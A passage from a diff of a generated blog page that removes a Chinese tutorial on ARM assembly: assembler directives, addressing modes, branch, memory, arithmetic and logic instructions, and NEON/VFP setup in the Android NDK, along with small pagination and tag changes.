@恢复sp寄存器的值</span><br><span class="line">    ldmfd   sp!, &#123;fp, pc&#125;		@恢复fp寄存器，并将1r寄存器值赋给pc寄存器</span><br><span class="line">.L4:							@标号.L4</span><br><span class="line">    .align  2					@声明对齐方式4字节</span><br><span class="line">.L3:							@标号.L3</span><br><span class="line">    .word   .LC0-(.LPIC0+8)		@保存字符串相对“add r3, pc, r3”的偏移量</span><br><span class="line">    .size   main, .-main		@main函数的大小为当前代码行减去main标号</span><br><span class="line">    .ident  &quot;GCC: (GNU) 4.4.3&quot;	@编译器标识</span><br><span class="line">    .section    .note.GNU-stack,&quot;&quot;,%progbits	@定义.note.GNU-stack段</span><br><span class="line">；；；；；；；；；</span><br><span class="line">框架：处理器架构定义、数据段、代码段与main函数</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>处理器架构定义</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.arch armv5te            @处理器架构</span><br><span class="line">.fpu softvfp             @浮点协处理器类型 </span><br><span class="line">.eabi_attribute 20, 1    @接口属性</span><br><span class="line">.eabi_attribute 21, 1	</span><br><span class="line">.eabi_attribute 23, 3</span><br><span class="line">.eabi_attribute 24, 1</span><br><span class="line">.eabi_attribute 25, 1</span><br><span class="line">.eabi_attribute 26, 2</span><br><span class="line">.eabi_attribute 30, 6</span><br><span class="line">.eabi_attribute 18, 4</span><br></pre></td></tr></table></figure>
-<p><strong>EABI</strong>（Embedded Application Binary Interface，嵌入式应用二进制接口）是ARM制定的一套接口规范,属性值在编译多数程序时都是固定的.</p>
-<ul>
-<li><strong>段定义</strong></li>
-</ul>
-<p>ARM汇编使用“.section”指令来定义段：<code>.section name[,&quot;flags&quot;[,%type[,flag_specifi_arguments]]]</code></p>
-<p>eg:name为段名，flags为段的属性如读、写、可执行等，type指定了段的类型，如progbits表示段中包含有数据、note表示段中包含的数据非程序本身使用，flag_specific_arguments指定了一些平台相关的参数。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.section    .rodata						定义只读数据段，属性采用默认</span><br><span class="line">.text									定义了代码段，没有使用.section关键字</span><br><span class="line">.section .note.GNU-stack,&quot;&quot;,%progbits	定义.note.GNU-stack段，它的作用是禁止生成可执行堆栈，用来保护代码安全</span><br></pre></td></tr></table></figure>
-<ul>
-<li>汇编器指令</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.file：指定了源文件名。</span><br><span class="line">.align：指定代码对齐方式，后面跟的数值为2的次数方。如“.align 4”表示2^4=16字节对齐。</span><br><span class="line">.ascii：声明字符串。</span><br><span class="line">.global：声明全局符号。全局符号是指在本程序外可以访问的符号。</span><br><span class="line">.type：指定符号的类型。“.type main, %function”表示main符号为函数。</span><br><span class="line">.word：用来存放地址值。“.word .LC0-(.LPIC0+8)”存放的是一个与地址无关的偏移量。</span><br><span class="line">.size：设置指定符号的大小。“.size main, .-main”中的点“.”表示当前地址，减去main符号的地址即为整个main函数的大小。</span><br><span class="line">.ident：编译器标识，无实际用途，生成可执行程序后它的值被放置到“.comment”段中。</span><br></pre></td></tr></table></figure>
-<h3 id="ARM寻址方式"><a href="#ARM寻址方式" class="headerlink" title="ARM寻址方式"></a>ARM寻址方式</h3><ul>
-<li>立即寻址  <code>MOV R0,#1234</code></li>
-<li>寄存器选  <code>MOV R0,R1</code></li>
-<li>寄存器移位寻址 <code>MOV R0,R1,LSL #2</code> R1寄存器左移2位，“R1 &lt;&lt; 2”后赋值给R0寄存器，R0=R1*4</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">操作前需要对源寄存器操作数进行移位操作:</span><br><span class="line">LSL：逻辑左移，移位后寄存器空出的低位补0。</span><br><span class="line">LSR：逻辑右移，移位后寄存器空出的高位补0。</span><br><span class="line">ASR：算术右移，移位过程中符号位保持不变，如果源操作数为正数，则移位后空出的高位补0，否则补1。</span><br><span class="line">ROR：循环右移，移位后移出的低位填入移位空出的高位。</span><br><span class="line">RRX：带扩展的循环右移，操作数右移一位，移位空出的高位用C标志的值填充。</span><br></pre></td></tr></table></figure>
-<ul>
-<li>寄存器间接寻址 <code>LDR R0,[R1]</code> 将R1寄存器的数值作为地址，取出地址中的值赋给R0寄存器</li>
-<li>基址寻址 <code>LDR R0,[R1, #-4]</code></li>
-<li>多寄存器寻址 <code>LDMIA R0,{R1,R2,R3,R4}</code></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDM是数据加载指令，指令的后缀IA表示每次执行完加载操作后R0寄存器的值自增1个字，</span><br><span class="line">ARM指令集中，字表示的是一个32位的数值。这条指令执行后，R1=[R0]，R2=[R0+#4]，R3=[R0+#8]，R4=[R0+#12]</span><br></pre></td></tr></table></figure>
-<ul>
-<li>堆栈寻址<ul>
-<li>ARM处理器特有寻址方式，堆栈寻址的指令有<code>LDMFA/STMFA、LDMEA/STMEA、LDMFD/STMFD、LDMED/STMED</code></li>
-</ul>
-</li>
-<li>块拷贝寻址：实现连续地址数据从存储器的某一位置拷贝到另一位置<ul>
-<li>块拷贝寻址的指令有<code>LDMIA/STMIA、LDMDA/STMDA、LDMIB/STMIB、LDMDB/STMDB</code></li>
-</ul>
-</li>
-<li>相对寻址：程序计数器PC的当前值为基地址，地址标号作为偏移量，将两者相加之后得到操作数的有效地址</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BL NEXT</span><br><span class="line">.....</span><br><span class="line">NEXT:</span><br><span class="line">.....</span><br><span class="line">@@@BL NEXT 是跳到NEXT标号处执行，BL采用的就是相对寻址，标号NEXT是偏移量</span><br></pre></td></tr></table></figure>
-<h3 id="ARM与Thumb指令集"><a href="#ARM与Thumb指令集" class="headerlink" title="ARM与Thumb指令集"></a>ARM与Thumb指令集</h3><h4 id="1-指令格式"><a href="#1-指令格式" class="headerlink" title="1.指令格式"></a>1.指令格式</h4><p><em>\<opcode>{\<cond>}{S}{.W|.N}\<rd>,\<rn>{,\<operand2>}</operand2></rn></rd></cond></opcode></em>        :opcode指令助记符，</p>
-<p>cond为执行条件，取值表：</p>
-<p><img src="/2018/08/22/Hello-ARM/1.png" alt="1"></p>
-<p>S指定指令是否影响CPSR寄存器的值。如ADDS、SUBS等，.W与.N为指令宽度说明符。（默认会生成16位的代码，.w为32，.N为16）。Rd为目的寄存器，Rn为第一个操作数寄存器，operand2为第二个操作数。第二个操作数可以是立即数、寄存器或寄存器移位操作。</p>
-<h4 id="2-跳转指令"><a href="#2-跳转指令" class="headerlink" title="2.跳转指令"></a>2.跳转指令</h4><p>两种方式可以实现程序跳转：一种是使用跳转指令直接跳转；一种是给PC寄存器直接赋值实现跳转。</p>
-<ul>
-<li><strong>B跳转指令</strong>    <em>B{cond}label</em></li>
-<li><strong>BL带链接的跳转指令</strong>  <em>BL{cond}label</em><ul>
-<li>当执行BL指令时，如果条件cond满足，会首先将当前指令的下一条指令的地址拷贝到R14（即LR）寄存器中，然后跳转到lable指定的地址处继续执行</li>
-<li>可以通过“<code>MOV PC, LR</code>”返回到主程序</li>
-</ul>
-</li>
-<li><strong>BX带状态切换的跳转指令</strong>  <em>BX{cond}Rm</em><ul>
-<li>当执行BX指令时，如果条件cond满足，则处理器会判断Rm的位[0]是否为1，</li>
-<li>如果为1则跳转时自动将CPSR寄存器的标志T置位，并将目标地址处的代码解释为Thumb代码来执行，即处理器会切换至Thumb状态；</li>
-<li>若Rm的位[0]为0，则跳转时自动将CPSR寄存器的标志T复位，并将目标地址处的代码解释为ARM代码来执行，即处理器会切换到ARM状态</li>
-</ul>
-</li>
-<li><strong>BLX带链接和状态切换的跳转指令</strong>  <em>BLX{cond}Rm</em> <ul>
-<li>BLX指令集合了BL与BX的功能，当条件满足时，除了设置链接寄存器，还根据Rm位[0]的值来切换处理器状态</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-存储器访问指令"><a href="#3-存储器访问指令" class="headerlink" title="3.存储器访问指令"></a>3.存储器访问指令</h4><ul>
-<li><p><strong>LDR</strong> 从存储器中加载数据到寄存器中</p>
-<ul>
-<li><p><em>LDR{type}{cond}Rd,label</em>   &amp;&amp; <em>LDRD{cond}Rd,Rd2,label</em></p>
-</li>
-<li><p>type指明了操作的数据的大小</p>
-<p><img src="/2018/08/22/Hello-ARM/2.png" alt="2"></p>
-</li>
-<li><p>cond为执行条件，Rt为要加载的寄存器</p>
-</li>
-<li><p>label为要读取的内存地址：三种表示方法</p>
-<ul>
-<li>1.直接偏移量，eg：LDR R8, [R9, #04] 、LDR R8, [R9], #04</li>
-<li>2.寄存器偏移,   eg:  LDR R8, [R9, R10, #04]</li>
-<li>3.相对PC,    eg：LDR R8, label1</li>
-</ul>
-</li>
-<li><p>LDRD一次加载双字的数据，将数据加载到Rd与Rd2寄存器中。</p>
-<ul>
-<li><code>LDRD R0,R1,label12</code> 从标号label12指向的内存中加载两个字的数据到R0与R1寄存器中。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>STR</strong> 存储数据到指定地址的存储单元</p>
-<ul>
-<li><em>STR{type}{cond}Rd,label</em>   &amp;&amp; <em>STRD{cond}Rd,Rd2,label</em></li>
-<li>type中的SB与SH对STR无效</li>
-<li><code>LDR R0, [R2, #04]</code> 将R0寄存器的数据存储到R2+4所指向的存储单元</li>
-</ul>
-</li>
-<li><p><strong>LDM</strong> 从指定的存储单元加载多个数据到一个寄存器列表</p>
-<ul>
-<li><em>LDM{addr_mode}{cond}Rn{!}reglist</em></li>
-<li>addr_mode取值:<img src="/2018/08/22/Hello-ARM/3.png" alt="3"></li>
-<li>cond为执行条件。Rn为基地寄存器，用于存储初始地址。！为可选的后缀。有！，则最终地址将写回到Rn寄存器中。</li>
-<li>reglist为用来存储数据的寄存器列表，用大括号括起来。</li>
-<li><code>LDMIA R0!,{R1-R3}</code>  依次加载R0指向的存储单元的数据到R1，R2，R3寄存器中</li>
-</ul>
-</li>
-<li><p><strong>STM</strong> 将一个寄存器列表的数据存储到指定的存储单元</p>
-<ul>
-<li><em>LDM{addr_mode}{cond}Rn{!}reglist</em></li>
-<li><code>STMDB R1!,{R3-R6,R11}</code>   将R3-R6，R11寄存器的内容存储到R1指向的存储单元</li>
-</ul>
-</li>
-<li><p><strong>PUSH</strong>  将寄存器推入满递减堆栈  <em>PUSH{cond}reglist</em></p>
-</li>
-<li><p><strong>POP</strong> 从满递减堆栈中弹出数据到寄存器   <em>POP{cond}reglist</em></p>
-</li>
-<li><p><strong>SWP</strong> 用于寄存器与存储器之间的数据交换 <em>SWP{B}{cond}Rd,Rm,[Rn]</em></p>
-<ul>
-<li>B是可选的字节，若有B，则交换字节，否则交换32位的字,cond为执行条件,Rd为要从存储器中加载数据的寄存器,Rm为写入数据到存储器的寄存器,Rn为需要进行数据交换的存储器地址。Rn不能与Rd和Rm相同。</li>
-<li>如果Rd与Rm相同，可实现单个寄存器与存储器的数据交换。<ul>
-<li><code>SWP R1,R1,[R0]</code>      将R1寄存器与R0指向的存储单元的内容进行交换</li>
-<li><code>SWPB R1,R2,[R0]</code>    从R0指向的存储单元读取一个字节存入R1（高24位清零），然后将R2寄存器的字节内容存储到该存储单元。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-数据处理指令"><a href="#4-数据处理指令" class="headerlink" title="4.数据处理指令"></a>4.数据处理指令</h4><p>所有的数据处理指令均<u>可选择使用S后缀，来决定是否影响状态标志</u>，比较指令不需要S后缀，它们会直接影响状态标志。</p>
-<ul>
-<li><p>数据传送指令</p>
-<ul>
-<li><strong>MOV</strong> 将8位的立即数或寄存器的内容传送到目标寄存器中 <em>MOV {cond}{S}Rd,operand2</em></li>
-<li><strong>MVN</strong>为数据非传送指令 ：将8位的立即数或寄存器按位取反后传送到目标寄存器中</li>
-</ul>
-</li>
-<li><p>算术运算指令</p>
-<ul>
-<li><strong>ADD</strong> 将Rn寄存器与operand2的值相加，结果保存到Rd寄存器 <em>ADD {cond}{S}Rd,Rn,operand2</em></li>
-<li><strong>ADC</strong>为带进位加法指令 :将Rn寄存器与operand2的值相加，再加上CPSR寄存器的C条件标志位的值，最后将结果保存到Rd寄存器 <em>ADC{cond}{S}Rd,Rn,operand2</em></li>
-<li><strong>SUB</strong> 用Rn寄存器减去operand2的值，结果保存到Rd寄存器中 <em>SUB {cond}{S}Rd,Rn,operand2</em></li>
-<li><strong>RSB</strong> 为逆向减法指令: 用operand2减去Rn寄存器，结果保存到Rd寄存器中 <em>RSB {cond}{S}Rd,Rn,operand2</em></li>
-<li><strong>SBC</strong> 为带进位减法指令: 用Rn寄存器减去operand2的值，再减去CPSR寄存器的C条件标志位的值，最后将结果保存到Rd寄存器 <em>SBC {cond}{S}Rd,Rn,operand2</em></li>
-<li><strong>RSC</strong> 为带进位逆向减法指令:用operand2减去Rn寄存器，再减去CPSR寄存器的C条件标志位的值，最后将结果保存到Rd寄存器 <em>RSC {cond}{S}Rd,Rn,operand2</em></li>
-<li><strong>MUL</strong> 为32位乘法指令,将Rm寄存器与Rn寄存器的值相乘，结果的低32位保存到Rd寄存器.<em>MUL {cond}{S}Rd,Rm,Rn</em></li>
-<li><strong>MLS</strong> 将Rm寄存器和Rn寄存器中的值相乘，然后再从Ra寄存器的值中减去乘积，最后将所得结果的低32位存入Rd寄存器中 <em>MLS {cond}{S}Rd,Rm,Rn,Ra</em></li>
-<li><strong>MLA</strong> 将Rm寄存器和Rn寄存器中的值相乘，然后再将乘积与Ra寄存器中的值相加，最后将结果的低32位存入Rd寄存器中 <em>MLA {cond}{S}Rd,Rm,Rn,Ra</em></li>
-<li><strong>UMULL</strong> UMULL指令将Rm寄存器和Rn寄存器的值作为无符号数相乘，然后将结果的低32位存入RdLo寄存器，高32位存入RdHi寄存器 <em>UMULL {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
-<li><strong>UMLAL</strong> 将Rm寄存器和Rn寄存器的值作为无符号数相乘，然后将64位的结果与RdHi、RdLo组成的64位数相加，结果的低32位存入RdLo寄存器，高32位存入RdHi寄存器 <em>UMLAL {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
-<li><strong>SMULL</strong> 将Rm寄存器和Rn寄存器的值作为有符号数相乘，然后将结果的低32位存入RdLo寄存器，高32位存入RdHi寄存器 <em>SMULL {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
-<li><strong>SMLAL</strong> 将Rm寄存器和Rn寄存器的值作为有符号数相乘，然后将64位的结果与RdHi、RdLo组成的64位数相加，结果的低32位存入RdLo寄存器，高32位存入RdHi寄存器 <em>SMLAL {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
-<li><strong>SMLAD</strong> 将Rm寄存器的低半字和Rn寄存器的低半字相乘，然后将Rm寄存器的高半字和Rn的高半字相乘，最后将两个乘积与Ra寄存器的值相加并存入Rd寄存器。 <em>SMLAD {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
-<li><strong>SMLSD</strong> 将Rm寄存器的低半字和Rn寄存器的低半字相乘，然后将Rm寄存器的高半字和Rn的高半字相乘，接着使用第一个乘积减去第二个乘积，最后将所得的差值与Ra寄存器的值相加并存入Rd寄存器 <em>SMLSD {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
-<li><strong>SDIV</strong> 为有符号数除法指令 <em>SDIV{cond}Rd,Rm,Rn</em></li>
-<li><strong>UDIV</strong> 为无符号数除法指令 <em>UDIV{cond}Rd,Rm,Rn</em></li>
-<li><strong>ASR</strong> 算术右移指令 将Rm寄存器算术右移operand2位，并使用符号位填充空位，移位结果保存到Rd寄存器中 <em>ASR{cond}{S}Rd,Rm,operand2</em></li>
-</ul>
-</li>
-<li><p>逻辑运算指令</p>
-<ul>
-<li><strong>AND</strong> 逻辑与指令 <em>AND{cond}{S}Rd,Rn,operand2</em> </li>
-<li><strong>ORR</strong> 逻辑或指令 <em>ORR{cond}{S}Rd,Rn,operand2</em></li>
-<li><strong>EOR</strong> 异或指令 <em>EOR{cond}{S}Rd,Rn,operand2</em></li>
-<li><strong>BIC</strong> 位清除指令 将operand2的值取反，然后将结果与Rn寄存器的值相“与”并保存到Rd寄存器中 <em>BIC{cond}{S}Rd,Rn,operand2</em></li>
-<li><strong>LSL</strong> 逻辑左移指令 将Rm寄存器逻辑左移operand2位，并将空位清0，移位结果保存到Rd寄存器中 <em>LSL{cond}{S}Rd,Rm,operand2</em></li>
-<li><strong>LSR</strong> 逻辑右移指令 将Rm寄存器逻辑右移operand2位，并将空位清0，移位结果保存到Rd寄存器中 <em>LSR{cond}{S}Rd,Rm,operand2</em></li>
-<li><strong>ROR</strong> 循环右移指令 将Rm寄存器循环右移operand2位，寄存器右边移出的位移回到左边，移位结果保存到Rd寄存器中 <em>ROR{cond}{S}Rd,Rm,operand2</em></li>
-<li><strong>RRX</strong> 带扩展的循环右移指令 将Rm寄存器循环右移1位，寄存器最高位用标志位的值填充，移位结果保存到Rd寄存器中  <em>RRX{cond}{S}Rd,Rm</em></li>
-</ul>
-</li>
-<li><p>比较指令</p>
-<ul>
-<li><strong>CMP</strong> 使用Rn寄存器减去operand2的值 不保存计算结果 根据比较结果设置标志位 <em>CMP{cond}Rn,operand2</em></li>
-<li><strong>CMN</strong> 将operand2的值加到Rn寄存器  不保存计算结果 根据比较结果设置标志位  <em>CMN{cond}Rn,operand2</em></li>
-<li><strong>TST</strong> 位测试指令 将Rn寄存器的值和operand2的值进行“与”运算 不保存计算结果 根据比较结果设置标志位  <em>TST{cond}Rn,operand2</em></li>
-<li><strong>TEQ</strong> 将Rn寄存器的值和operand2的值进行“异或”运算 不保存计算结果 根据比较结果设置标志位  <em>TEQ{cond}Rn,operand2</em></li>
-</ul>
-</li>
-<li><p>OTHER</p>
-<ul>
-<li><p><strong>SWI</strong> 软中断指令 用于产生软中断，实现从用户模式到管理模式的切换 <em>SWI{cond},immed_24</em></p>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">immed_24为24位的中断号，在Android的系统中，系统功能调用为0号中断，使用R7寄存器存放系统调用号。</span><br><span class="line">使用R0-R3寄存器来传递系统调用的前4个参数，对于大于4个参数的调用，剩余参数采用堆栈来传递。</span><br><span class="line">MOV	R0,#0	@参数0</span><br><span class="line">MOV R7,#1	@系统功能号1为exit</span><br><span class="line">SWI	#0		@执行exit(0)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>NOP</strong> 空操作指令 用于空操作或字节对齐</p>
-</li>
-<li><p><strong>MRS</strong> 读状态寄存器指令 <em>MRS Rd,psr</em>  (psr的取值可以是CPSR或SPSR)</p>
-</li>
-<li><p><strong>MSR</strong>  写状态寄存器指令 <em>MSR Rd,psr_fielsd,operand2</em>  (field指定传送的区域)<br> <img src="/2018/08/22/Hello-ARM/4.png" alt="4"></p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MRS	R0,CPSR			@读取CPSR寄存器到R0寄存器中</span><br><span class="line">BIC	R0,R0,#0x80		@清除R0寄存器第7位</span><br><span class="line">MSR	CPSR_c,R0		@开启IRQ中断</span><br><span class="line">MOV	PC,LR			@子程序返回</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="NEON与VFP指令集"><a href="#NEON与VFP指令集" class="headerlink" title="NEON与VFP指令集"></a>NEON与VFP指令集</h3><p>NEON与VFP指令集是ARM指令集的扩展，多用于多媒体编程与浮点计算。（<strong>少见</strong>）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//要求</span><br><span class="line">1.在Android.mk文件中加入一行 LOCAL_ARM_NEON := true</span><br><span class="line">2.(NEON是ARMv7才支持的指令集)，需要设置TARGET_ARCH_ABI的值为armeabi-v7a</span><br><span class="line">3.Android NDK提供了一个“cpufeatures”库来让开发者在运行时检测处理器的能力,解决兼容</span><br><span class="line">4.使用“cpufeatures”库的方法</span><br><span class="line">	a.首先在Android.mk文件中添加 $(call import-module,android/cpufeatures)</span><br><span class="line">	b.C/C++代码中包含头文件 cpu-features.h </span><br><span class="line">	c.头文件中定义了一些结构体与枚举常量，并且包含了android_getCpuFamily()、android_getCpuFeatures()与android_getCpuCount()</span><br><span class="line">		A.android_getCpuFamily()函数用来获取处理器的家族信息,返回一个常量值ANDROID_CPU_FAMILY_ARM</span><br><span class="line">		B.android_getCpuFeatures()函数用来检测处理器支持的指令集,如果处理器支持NEON指令集，则返回的64			位数值中ANDROID_CPU_ARM_FEATURE_NEON标志就会被置位，如果处理器支持VFPv3指令集，则			     ANDROID_CPU_ARM_FEATURE_VFPv3就会被置位</span><br><span class="line">		C.android_getCpuCount ()函数用来获取处理器的核心数</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/22/Hello-ARM/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
     </nav>
   
 
@@ -1393,11 +1310,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Web</a>
+                <a href="javascript:void(0)" class="js-tag color5">Java</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Java</a>
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
               </li>
              
               <li class="article-tag-list-item">
